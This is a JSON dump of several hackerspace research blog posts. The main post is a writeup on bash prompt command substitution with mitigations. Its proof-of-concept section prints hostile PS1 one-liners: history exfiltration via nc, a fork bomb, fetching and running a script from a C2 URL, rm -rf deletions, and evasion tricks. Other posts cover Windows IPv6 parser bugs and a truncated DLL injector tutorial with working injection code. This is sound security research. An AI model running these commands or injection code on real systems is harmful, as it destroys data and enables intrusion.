{"pageProps":{"posts":[{"title":"Stupid bash tricks- command substitution, command injection, and the bash command prompt","slug":"bash-command-injection","date_published":1738034100000,"date_updated":1738034100000,"tags":["linux","shell","bash","command injection","parsing","langsec"],"excerpt":"It turns out you can use special characters in linux names.  What could possibly go wrong?","cover":"2024/01/bash-source.png","author":{"name":"MalcolmS","avatar":"avatars/malcolms.jpg"},"content":"\nIt turns out you can use special characters in linux user names.  Cute, but it can have some unexpected consequences.  Be glad your user name isn’t `$(rm -rf ~)` for instance.  Can you guess what happens when you open up your first interactive bash shell?\n\n# Command Substitution\nYup, command substitution happens.  Bye bye, files.  Bash, like all good shells, will take the output of a command contained within $() or `` (backticks) and substitute the command’s output into the string where the command was.  Pretty handy for all kinds of shell tasks, and it even works in the prompt definition string.  Even if your user name happens to be an injected command!\n\nThis happens because it's typical for the prompt to contain the user name.  Bash uses the environment variable, PS1 to define the prompt string.  Escaped characters like \\u and \\w, for instance, get expanded into other strings that are useful for dynamic prompt components, like the user name or working directory.  But even more flexibility comes from substituting the output of an arbitrary command.  In the above example, the \\u in the prompt string gets substituted by `$(rm -rf ~)`, which then gets substituted by the output of running that command.  Even if the command yields no output, it has still been run.\n\nBash also recognizes PS2, PS3, and PS4, for various, less-commonly seen prompts.  PS2 is probably most familiar to the average user as the \"> \" prompt when entering a multi-line command.  All the parsing and command substitution topics discussed below also apply to those prompts, but they are less frequently encountered.  Other than to briefly note here that they might provide a more obscure or niche attack vector, they will not be discussed further in this writeup.\n\n# Parsing\nShells have to do a lot of parsing, and do it correctly, every time.  Writing good parsers is actually really hard, in part because it’s so easy to write vulnerable code.  It’s been suggested that writing parsers should be done as rigorously as writing cryptographic libraries<sup>1</sup>– in other words, don’t “roll your own.”\n\nIf you need a parser that doesn’t already exist, and don’t want to write it from scratch yourself, you’re in luck.  General purpose parser generators, like GNU Bison<sup>2</sup>, Yacc (Yet Another Compiler Compiler)<sup>3</sup> and various others take a user-defined, context free grammar and use it to output code (C, in this case) that performs the corresponding parsing for you.\n\nThe bash code base employs Bison to generate a core function called yyparse from the grammar defined in `parse.y`.  This file also contains C code snippets which Bison copies directly, along with the generated yyparse, into a source file called `y.tab.c`.\n\nWhen parsing `PS1`, Bash expands \\ characters (like \\u and \\w) before it performs command substitution.  This is why `\\u` -> `$(rm -rf ~)` -> `<command execution>`.  But suppose that your working path contains a directory named `$(ls)`?  Will `ls` be run?  In this case, actually, no.  The reason is that the bash source code (in `parse.y`, function `decode_prompt_string`) puts the directory string into double quotes, masking it from future expansion.\n\nAs of the latest stable release at the time of this writeup (5.2), bash doesn’t double-quote user names after expansion from \\u, though.  The good news: the expanded \\u will be double-quoted in a future release.<sup>4,5</sup>  This exempts the user name string from being parsed for command substitution.\n\nWhen bash finds a command substitution that it needs to parse in `PS1`, it begins a series of nested calls starting with `decode_prompt_string` in `parse.y`, and going back and forth between routines in `parse.y`, `subst.c`, and `builtins/evalstring.c`, early on joining the common pathway of command substitution, and ultimately calling `execute_command_internal` in `execute_cmd.c`.  The subshell created to do this captures the output of the command and returns it to `decode_prompt_string`, and that goes into your prompt string.\n\nNote: This article specifically focuses on how bash does this, but some other shells will do it in their own way, too.  \\[D\\]ash will execute commands, as will zsh if you first enable the PROMPT_SUBST (promptsubst) option,<sup>6,7</sup> but many others will not.\n\nIt’s worth mentioning that commands executed via substitution don’t make it, by themselves, into the `.bash_history` file.  And why should they?  These substitutions are helpers that are often part of scripts or other automated tasks.  The history file would fill up quickly with chaff unless it ignored all of these commands.  Generally speaking, only commands typed into the CLI make it into history.  For more information, see the history man page, or a nice writeup by MattCASmith.<sup>8</sup>\n\n# The Command Prompt\nCommand substitution is, of course, an indispensable part of shells.  And it’s a convenient way to inject useful dynamic text into your prompt string.  But if you simply want to execute a command before every prompt, command substitution in the prompt string is not your “go-to” way to do this.\n\nFor that purpose, bash offers the user an environment variable called `PROMPT_COMMAND`, and it runs this command before it gets into the business of generating each command prompt.  `PROMPT_COMMAND` can also work in concert with `PS1`, depending on how you wanted to do things.  But almost anything you can do with `PROMPT_COMMAND` can also be crammed into `PS1`, with at least one major exception.  `PROMPT_COMMAND` commands are executed in the current shell, but `PS1` substituted commands are performed in a subshell.  The impact of this is that environment changes in the subshell die with the subshell and do not back-propagate to the parent shell.  So, output redirection and environment variable changes are durable if done by `PROMPT_COMMAND`, but ephemeral if done by `PS1`.  Another difference: `PS1` will expand special escape characters, such as ‘\\u’ for user names, as mentioned above, but `PROMPT_COMMAND` will not.\n\nDifferent linux distributions and shells tend to offer their own default versions of what they consider to be a useful and aesthetic prompt.  But many users customize `PS1` to suit their own needs.  One category of uses is for presenting timely information.  For instance, you might have it display your IP address, or change colors depending on the most recent exit status, or show which git branch is checked out in your working directory.\n\nAnother category of uses involves automating frequent tasks or checks.  For instance, commands run by `PS1` or `PROMPT_COMMAND` might run `history -a` to ensure every regular command that has been executed is written immediately to `.bash_history` instead of waiting until the terminal session closes--which helps prevent loss of history if the shell is SIGKILLed or power is suddenly lost.\n\nThis capacity can, of course, be used for mischief in the wrong hands.  It may seem like an inefficient method for an attacker, because if they can change an environment variable for your prompt, they can probably execute other code, so why would they bother with this?\n\nOne scenario involves the delivery phase.  A threat actor may have only a brief window of opportunity to enter commands on a keyboard.  Or, they might social engineer a victim to run a malicious script which edits `PS1` or `.bashrc`.  These opportunities might establish a foothold.  Another scenario might involve an attacker who already owns the victim’s account, but needs to avoid certain canaries or countermeasures.\n\nYet another, potentially powerful exploit, could involve a compromised authentication server.  If an attacker can add or control account names in the server's database, providing a login as `$(some-command)` might allow for code execution on an otherwise hardened network host.  `some-command` could launch a reverse shell, for instance, to help traverse a firewall.  This is a potential area for future research.\n\n# Mitigation, Part 1\nTo put it simply: if an attacker can control the user name, a defender must watch out for expansion by \\u.  If the attacker can control `PS1` or `PROMPT_COMMAND` directly, it doesn't necessarily matter what the user name is; the defender must always protect the environment variables.  These are similar attack vectors that share a common, final pathway.  In practice, both should be guarded against in accordance with one's threat model, resources, and priorities.  Eliminating all command substitution entirely would be an effective, but quite extreme, measure, and one not likely to be worth the costs in most cases.  It would generally require a custom patch, but the change would be easy.  User name-based command substitution, on the other hand, should be less of an issue in future releases (see above).\n\nBeyond universal security principles (including hardening and regular audits/updates on any network authentication servers), specific mitigations for command substitution attacks could include periodic or automatic verification of the contents of `.bashrc`, `/etc/environment`, any routine scripts, and specific environment variables.  It’s worth being aware that modules like PAM can also set environment variables, although an exploit at this level would entail more dire concerns.\n\n`PS1` and `PROMPT_COMMAND` can both contain commands to validate themselves and/or the other variable, and alert the user if an unexpected state is detected.  `PROMPT_COMMAND` could reset `PS1` to a trusted value.  Either could perform validation, for instance by comparing against a trusted value (such as a string or hash stored in a write-protected file).  This would be an imperfect, but relatively inexpensive, method for situations where you could screen for changes in `PS1`.\n\nExample, in .bashrc:\n\n    PROMPT_COMMAND=’echo $PS1 | md5sum -z | diff ~/.myPS1hash - > /dev/null;\\\n    if [[ $? -gt 0 ]]; then\\\n          echo Warning, PS1 altered;\\\n        else\\\n          echo PS1 OK;\\\n    fi; # ugly\n    \n    Or in PS1:\n    PS1='$( \\\n        echo $PS1 | md5sum -z | diff -q - ~/.myPS1hash >/dev/null; \n        if [[ $? -eq 0 ]]; then \\\n            echo -e \"\\033[1;32m\\u@\\h:\\w\\\\$ \\033[0m\"; \\ # Green text means OK\n        else \\\n            echo -e \"\\033[1;31m\\u@\\h:\\w\\\\$ \\033[0m\"; \\ # Red text is bad\n        fi )' # less ugly\n\nOnce you set your new `PS1`, just `echo $PS1 | md5sum -z > ~/.myPS1hash` and make sure it is write protected, or give ownership to root, or put it on a read-only medium.\n\n# Mitigation, Part 2\nSince this is, essentially, a screening methodology, it is worth interjecting a few words on proper screening test design.\n\nAn ideal screening test is fast, cheap and highly sensitive, at the expense of specificity.  In other words, you accept the burden of many false positive results, for the benefit of being less likely to miss a true positive event.  Given that a test which is fast and cheap will probably suffer costs in the accuracy department, the screening test is usually intentionally tuned to favor flagging something as abnormal if there’s any uncertainty.  The mitigation strategy described so far, of checking for changes in variables, is highly specific, i.e. it’s not likely to falsely report a change in a string.  But, it’s not very sensitive, i.e. there are many ways an effective attacker could defeat it.  In other words, it’s the opposite of what a good screening test should be, in at least some ways.\n\nUnfortunately, in cybersecurity, sensitivity is an ever-elusive goal.  With intelligent adversaries trying to be as undetectable as possible, creating a high sensitivity screening test for this situation can be very difficult.  Easy screening methods for this attack all basically depend on the attacker not being aware of, nor bothering to try, circumvention.\n\nNot only are simple detection methods easy to circumvent, but robust detection methods are hard to create.  Indeed, a specific challenge here is that it is tough to actively monitor these variables from outside the shell itself.  `/proc/<pid>/environ` can helpfully show the shell’s initial environment, but it only updates when the process starts, and is therefore insufficient.  Following an environment variable directly from outside the shell would probably require something on the level of a ptrace system call.  Now we’re getting into some pretty invasive monitoring, which is less easy to set up and may entail significant performance costs.  One could indirectly follow environment variables by periodically exporting the environment to a file, and ensuring a daemon monitors that file.  But even that method suffers from various weaknesses, especially if it depends on `PROMPT_COMMAND` or `PS1` themselves to do the exporting.  There are open source tools that may be able to monitor a process' internal environment, but they are untested by this author.\n\n# Mischief\nThe point is not to present malicious code here, but to provide proof of concept for non-trivial attacks, such as denial of service, data destruction, or exfiltration.  And while pretty much all of these could be adapted into `PROMPT_COMMAND`, they are simply shown here in `PS1=` form to highlight command substitution.\n\nOne thing an attacker wouldn’t want to do, would be to make an obvious change to the appearance of the command prompt itself.  The following examples assume a basic command prompt appearance for simplicity's sake, but a better approach might involve `PROMPT_COMMAND` capturing the original `PS1` into a backup variable, so then `PS1` can invoke that backup variable to recreate the original appearance.\n\n### Examples (i.e. PS1=' ', using single quotes)\n\nNuisances: Injecting delays, screen clearing pranks\n\n    '$(sleep 2)\\u@\\h:\\w$ '\n    '$(clear)\\u@\\h:\\w$ '\n\nSnooping on command history:\n\n    '$(history -a; tail -n 1 ~/.bash_history | nc -q 0 localhost 12345)\\u@\\h:\\w$ '\n    # set up a listener on localhost 12345 to snoop on what the user is running.\n    # nc -u might be necessary or simpler in some cases, too.\n\nThere are limits to how real-time you can snoop.  You might expect this would allow for complete output logging:\n\n    '$([[ -t 1 ]] && exec > >(tee >(nc -q 0 localhost 12345)) 2>&1)\\u@\\h:\\w$ '\n\nBut, this does not work.  The command is run in a sub-shell, so any output redirection method that is born there, dies there.  This aspect makes it hard, if not impossible, to use output redirection as intended. (Prove me wrong, though!)\n\nFork bombing (see evading, below):\n\n    '`bomb() { bomb | bomb& }; bomb`\\u@\\h:\\w$ '\n    # can obfuscate easily by replacing 'bomb' with a single character\n\nRCE / fetching commands from a C2 server:\n\n    '$(wget -q -O - www.example.com/c2/script_to_run.sh | sh)\\u@\\h:\\w$ '\n\nGradually filling up the file system:\n\n    '`echo \\`cat ~/.profile\\` >> ~/.profile`\\u@\\h:\\w$ '\n\nDeleting a user's home folder:\n\n    '$(rm -rf ~)\\u@\\h:\\w$ '\n\n    '$(rm -rf /* > /dev/null 2>&1)\\u@\\h:\\w$ '\n\nThe latter will not delete everything, but it will delete everything the user is privileged for, including their home folder. As a bonus, it will also tie things up for a while as it traverses the entire filesystem.\n\nDeleting all files (after tricking them into entering the sudo pw)\n\n    '$(sudo rm -rf /*)\\u$\\h:\\w$ '\n\nSome potential attacks are limited by the command substitution occurring in a subshell.  Future work might include how to potentially use a tool like script to log all shell text, or how to build an actual keylogger, which would be more complicated.  Another complicated exploit might involve engineering the user into entering their current password, which could be exfiltrated or used to change the password itself.\n\n# Evading detection:\nSome actions, like erasing a user’s home folder, or fork bombing, are so drastic that they likely result in immediate discovery of the attack.  An attacker can be sneakier by combining some of the more impactful attacks with a probabilistic check.  If a fork bomb only executes 1 in 100 times, for instance, it is much more likely to misdirect blame toward something else:\n\n    'if [ $(($RANDOM % 100)) -eq 1 ]; then do_something_nasty; fi'\n\nThese commands kind of stick out in PS1.  Maybe we can obfuscate them a little bit.  What about base64 encoding your command?\n\n    '$(echo c2xlZXAgMg== | base64 -d)'\n\nYou could also use `PROMPT_COMMAND` to auto-revert `PS1`, to hide your tracks.  If you recall above, `PS1` cannot do this to itself, due to the subshell.  Only a `PROMPT_COMMAND` instruction can do this reversion.  Despite that, there are lots of ways to do this (assume `check_for_something` is a function the attacker controls):\n\n    'if [ \"$(check_for_something)\" -eq 1 ]; then PS1=$OLDPS1 \"; fi'\n    '[ “$(check_something 2> /dev/null)” ] && PS1=$OLDPS' # trivially more concise, but potentially less robust than an if statement\n\n\nRecent versions of bash (since 5.1-alpha) allow `PROMPT_COMMAND` to be an array of commands.  This could facilitate removing incriminating commands without having to selectively regenerate an entire, long string.\n\nSpeaking of covering your tracks, remember how prompt command substitution does not show up in bash history? There are, of course, many ways to avoid recording commands in the bash history, but one of them might be executing them by prompt command substitution. Forensic investigators should already understand that bash history is relatively specific, but not sensitive, diagnostically speaking.  In other words: if something is in the history, it probably happened...  but if it’s not there, it doesn’t mean it didn’t happen.\n\nA final word on user names: this whole journey began with the observation (By Ben Kallus and Jonah Weinberg of ISTS/Dartmouth College) that linux behaves strangely when a user has a malicious name, like `$(rm -rf ~)`.  But the user name could be malicious without invoking command substitution.  For instance, the user name \"`../tmp`\", yields an unexpected account with a valid, but non-obvious, home folder, which could serve as a back door of sorts.\n\nThere have even been recent debates<sup>9</sup> about what kinds of special characters, non-ASCII character sets, or other patterns warrant closer scrutiny in Debian user names.  While it is understandable and perhaps even supportable that many users want characters beyond ASCII, great care should be taken to avoid introducing new security risks.  The case of character confusion over identical- or similar-appearing unicode characters is a prime example.  One must expect that any broad increase in complexity will inevitably carry with it new security risks, and prepare accordingly.\n\nPrompt command substitution is powerful, flexible, and completely agnostic towards your security concerns.  Many of the above examples can be combined for greater effect.  Have fun experimenting with them, and try not to erase your home folder while you're at it!\n\n# Acknowledgements\nThanks to Ben Kallus and Jonah Weinberg for ideas and discussions, and for originally identifying user name command substitution.  Additional thanks to Solra Bizna and Pips of 801 Labs for peer review.\n\n# References\n\n1. Bratus, et al. Curing the Vulnerable Parser: Design Patterns for Secure Input Handling.  Usenix ;login:, Spring 2017 Vol. 42, NO. 1, 32-39\n\n2. https://www.gnu.org/software/bison/\n\n3. https://www.cs.utexas.edu/~novak/yaccpaper.htm\n\n4. https://savannah.gnu.org/patch/?10496\n\n5. https://git.savannah.gnu.org/git/bash.git, branch 'devel' commit 25e213a, 24 Jan 2025.\n\n6. https://manpages.debian.org/bookworm/ash/ash.1.en.html\n\n7. https://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html\n\n8. https://mattcasmith.net/2022/02/22/bash-history-basics-behaviours-forensics\n\n9. https://lwn.net/ml/all/Zz9xogrnHDSFjZUn@torres.zugschlus.de/\n\n\n"},{"title":"Writing research posts","slug":"writing-research-posts","date_published":1635906784000,"date_updated":1650803715000,"tags":["How to","Tutorial"],"excerpt":"This guide will go over all the details and steps required to post a research article.","cover":"image.png","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nLets talk about how to write a research post to appear on the research portal https://801labs.org/research-portal/1/\n\nPreviously, we used the platform Ghost to write and publish research articles, how tos, and anouncments. This time around in the new website, we have had the research blog function built directly in. \n\nAll a user has to do to create an article\n* go into [Github](https://github.com/801labs/801labs.org)\n* fork the repo\n* navigate to the `/content/research` directory in the `main` branch.\n* create a new file with a dash seperated name, such as `example-post.md`\n* import the below code block into your new markdown file. This block of code instructs the website on how to display information about the post. This includes tags, a title, a cover image, an author, etc.\n\n\n```\n---\ntitle: <A solid Title>\nslug: a-good-slug\ndate_published: 2018-10-25T02:33:04.000Z\ndate_updated: 2018-10-25T02:35:15.000Z\ntags: tag1, tag2\nexcerpt: A brief little discription of what your post is about.\ncover: 'folder/for/image.jpg'\nauthor:\n  name: your name\n  avatar: 'avatars/youravatar.jpeg'\n---\n```\n\n* write your post\n* create a pull request with your post\n"},{"title":"Quirks in the Windows IPv6 address parsing and printing APIs","slug":"quirks-in-the-windows-ipv6-address-parsing-and-printing-apis","date_published":1607065200000,"date_updated":1607071561000,"tags":["research","WINDOWS API","IPv6"],"excerpt":"Half of the world still lacks Internet access, but there are no IPv4 addresses left to hand out - which means that software libraries for IPv6 deserve scrutiny now.","cover":"2020/12/ipv6_sticker.jpg","author":{"name":"Alex Henrie","avatar":"avatars/alexhenrie.png"},"content":"\n[Half of the world still lacks Internet access](https://en.wikipedia.org/wiki/Global_Internet_usage#Internet_users), but [there are no IPv4 addresses left to hand out](https://ipv4.potaroo.net/). On the other hand, [33% of Google's customer base has a working IPv6 connection now](https://www.google.com/intl/en/ipv6/statistics.html ) and [Apple is pushing developers to switch just for the performance benefits](https://www.zdnet.com/article/apple-tells-app-devs-to-use-ipv6-as-its-1-4-times-faster-than-ipv4/). It's clear that IPv6 will be increasingly important as time goes on, which means that software libraries for IPv6 deserve scrutiny now.\n\nMicrosoft Windows has accumulated numerous API functions for converting IPv6 addresses from text to binary (parsing) and from binary to text (printing), including:\n\n*   [iphlpapi.ParseNetworkString](https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-parsenetworkstring)\n*   [ws2\\_32.inet\\_ntop](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton)\n*   [ws2\\_32.InetNtopW](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inetntopw)\n*   [ws2\\_32.inet\\_pton](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton)\n*   [ws2\\_32.InetPtonW](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inetptonw)\n*   [ws2\\_32.WSAAddressToStringA](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaaddresstostringa)\n*   [ws2\\_32.WSAAddressToStringW](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaaddresstostringw)\n*   [urlmon.CreateUri](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)) (string normalization only)\n*   dnsapi.DnsIpv6AddressToString (undocumented)\n*   dnsapi.DnsIpv6StringToAddress (undocumented)\n\nHowever, all of these functions behave identically to, and are surely built upon, the following:\n\n*   [ntdll.RtlIpv6AddressToStringA](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6addresstostringa)\n*   [ntdll.RtlIpv6AddressToStringW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6addresstostringw)\n*   ntdll.RtlIpv6AddressToStringExA (not explicitly documented)\n*   [ntdll.RtlIpv6AddressToStringExW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6addresstostringexw)\n*   [ntdll.RtlIpv6StringToAddressA](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressa)\n*   [ntdll.RtlIpv6StringToAddressW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressw)\n*   ntdll.RtlIpv6StringToAddressExA (not explicitly documented)\n*   [ntdll.RtlIpv6StringToAddressExW](https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressexw)\n\nThe two RtlIpv6AddressToString functions only print plain IPv6 addresses. The _Ex_ suffix in the RtlIpv6AddressToStringEx functions indicates that they were added later, and they can print addresses with or without a network interface number or port.\n\nLikewise, the RtlIpv6StringToAddress functions are older and can only parse plain IPv6 addresses. They report the _terminator_ via a pointer argument, the terminator being the first unparsable character in the input string. The newer RtlIpv6StringToAddressEx functions can, in addition to parsing unadorned addresses, parse text that includes a network interface number or port. Furthermore, the Ex functions are more strict about what they accept than the originals: They do not report the terminator because they just return an error code if the address does not end at the end of the string.\n\nThis year (2020), I [implemented all eight of those ntdll functions for Wine](https://source.winehq.org/git/wine.git/blob/bedfb9cae224a369efa4588332a5518dbee57035:/dlls/ntdll/rtl.c#l1091) from scratch, knowing nothing about how the Windows implementations are coded. I tested millions of string inputs to determine exactly what counts as an IPv6 address in Windows, and in the process found some interesting quirks that could lead to security vulnerabilities in Windows software.\n\n## RtlIpv6StringToAddress(Ex) might give you the wrong address\n\nIn a spec-conformant IPv6 address parser, a `::` [represents two or more bytes of zeros](https://tools.ietf.org/html/rfc4291#section-2.2). In the Windows APIs, this is only true if the double colon is in the middle or at the end of the address: If it comes at the beginning, it counts as at least four bytes of zeros. For example, if the address `::1` were written as `::0:0:0:0:0:0:0:1` (perfectly valid according to the spec), RtlIpv6StringToAddress reports that the terminator is the last `:` instead of the null terminator `\\0` and it returns `STATUS_SUCCESS`. RtlIpv6StringToAddressEx is better because it returns the error code `STATUS_INVALID_PARAMETER` instead. Nevertheless, both functions fill the address buffer with the parsed address, minus two bytes at the end and plus two zero bytes at the beginning. In this example, the binary address that is stored will be `::` instead of `::1`. If the calling program does not check for errors thoroughly, this defect could expose sensitive data by causing server software to bind to `::` (all addresses) instead of `::1` (localhost only).\n\nThe fact that Windows fails to parse some valid addresses is a compelling reason to avoid using the Windows IPv6 parsing APIs altogether, since differences between how IPv6 implementations output and interpret addresses can lead to software incompatibility. I felt that this was such a glaring problem that I wrote to Microsoft Security about it in January 2020, but because they did not consider it to be a significant security issue, it has yet to be fixed.\n\n## RtlIpv6AddressToString writes past the null terminator\n\nRtlIpv6AddressToString always zeroes out the 46th character of the buffer, even though the longest possible normalized native IPv6 address is only 39 characters:\n\n`1111:2222:3333:4444:5555:6666:7777:8888`\n\nIf the input is an [ISATAP](https://en.wikipedia.org/wiki/ISATAP) address (indicated by `0` or `200` in the fifth component and `5efe` in the sixth component), the longest possible normalized address increases to 44 characters in length, which is still one less than 45:\n\n`1111:2222:3333:4444:200:5efe:255.255.255.255`\n\nOverwriting the 46th character could cause a buffer overflow if the function is given an output buffer of less than 46 characters. The problem was fixed in RtlIpv6AddressToStringEx, which writes the minimum number of characters necessary.\n\n## RtlIpv6StringToAddress does not limit the length of the last component\n\n[An IPv6 address is invalid if any of its components are longer than four digits](https://tools.ietf.org/html/rfc4291#section-2.2) (even if the extra digits are just leading zeros). And since IPv6 address components are hexadecimal by default, there's no prefix like `0x` to switch from decimal to hexadecimal. However, RtlIpv6AddressToString waives the length requirement for the last component if it is prefixed with `0x`, for example:\n\n`::0x9999999999999999999999999999999999999999999999999999999999999999999999abcd`\n\nNo matter how long the last component is, if it starts with `0x` and contains only hexadecimal digits, the value is taken from the last four digits (`::abcd` in this example), the terminator is set to the `x`, and `STATUS_SUCCESS` is returned. This could result in a buffer overflow if an address that RtlIpv6AddressToString validates is assumed to be 45 characters or less and then copied to a 45-character buffer. The problem is more or less fixed in RtlIpv6StringToAddressEx, which returns `STATUS_INVALID_PARAMETER` if it encounters a `0x`, although it still parses and saves the value following the `0x` in the same way as RtlIpv6StringToAddress.\n\n## Best practices\n\nWith all of the above in mind, here's what I recommend:\n\n*   For the sake of interoperability, avoid the Windows IPv6 parsing APIs if possible. Use an external library such as [ipv6-parse](https://github.com/jrepp/ipv6-parse) instead.\n*   If you do use the Windows IPv6 parsing or printing APIs, always use the Ex functions instead of the older ones.\n*   Check the return value of RtlIpv6StringToAddressEx for errors, even if you have already validated the IPv6 address with a spec-conformant parser.\n\nHappy coding! And if you're not already using [Wine](https://www.winehq.org/), be sure to check out the Wine 6.0 release (I'll be calling it \"Wine Vista\") which is due out at the beginning of next year. Apart from improved IPv6 support, compatibility with popular Windows software has taken an enormous step forward since Wine 5.0 thanks to an overhauled software architecture and tighter integration with MinGW.\n\nPhoto credit: [Phil Wolff](https://www.flickr.com/photos/philwolff/5557354098/in/photolist-9t5TKY-jKi9BZ-reZriP-csBi4j-bozscb-5XWDVu-8qdoiy-9GWxX7-cc8j1J-ost5VM-cj45H5-7FQyVD-5XWDVm-58Zu4e-nQ4nF5-nxHJA4-d8vfpA-nxHH9r-8qdobj-9TExeZ-bvov6x-5NtZnq-7yQMwe-cCjXzo-4qQ54q-48dbjJ-23s1XwA-GxGQpg-brFDWM-bdQpKT-bdPJ1F-brEEDH-2h3Jv9-c2pZVE-bdQgai-nEho6E-9UfTM8-bdQ3N4-6QdWkz-aousCH-kwkHqE-bdQeyz-brEEzR-9QT9bn-9THsMQ-bdQ6Xa-bdQaA4-brFJoP-bdPQki-bdPM64)"},{"title":"DLL injection - Developing a simple injector.","slug":"developing-a-dll-injector","date_published":1549513920000,"date_updated":1562884307000,"tags":["how to","DLL Injection","Windows Hacking","Development","memory","Windows API"],"excerpt":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr << \"Getting remote target process ID failed...\" << std::endl;\n    return 1;\n    }\n    \n    // <snipped> ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr << \"Acquiring a handle to the remote target process failed...\" << std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"The given process ID is invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout << \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false && !pid_str.size());\n    \n    \tif (pid_str != \"exit\" &&\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout << \"DLL path: \" << dll_path << std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"Specified DLL path was invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tstd::cout << \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr << \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"DLL allocation memory address: \" << &dll_path_in_remote_mem_addr << std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout << \"WriteProcessMemory was \" << (write_status ? \"successful!\" : \"unsuccessful...\") << std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr << \"GetLastError() for failed WriteProcessMemory() call: \" << GetLastError() << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    